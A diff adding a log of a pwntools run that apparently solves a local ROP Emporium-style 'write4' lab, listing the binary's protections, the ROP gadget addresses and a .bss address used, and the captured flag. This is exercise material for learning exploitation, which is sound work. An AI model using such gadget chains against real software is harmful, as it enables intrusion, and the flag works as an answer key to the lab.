@@ -1,0 +1,23 @@
+[*] '/root/techlabs/verify-pwn-b/6.4/write4'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[x] Starting local process './write4'
+[+] Starting local process './write4': pid 429038
+[*] Loading gadgets for '/root/techlabs/verify-pwn-b/6.4/write4'
+[*] pop rdi            = 0x401201
+[*] pop r14 ; pop r15  = 0x401203
+[*] mov [r14], r15     = 0x401208
+[*] .bss data          = 0x404150
+[x] Receiving all data
+[x] Receiving all data: 1B
+[x] Receiving all data: 45B
+[+] Receiving all data: Done (45B)
+[*] Stopped process './write4' (pid 429038)
+ FLAG{rop_emporium_local_equivalent_p6_2026}
+
+[+] write4 OK: da in flag
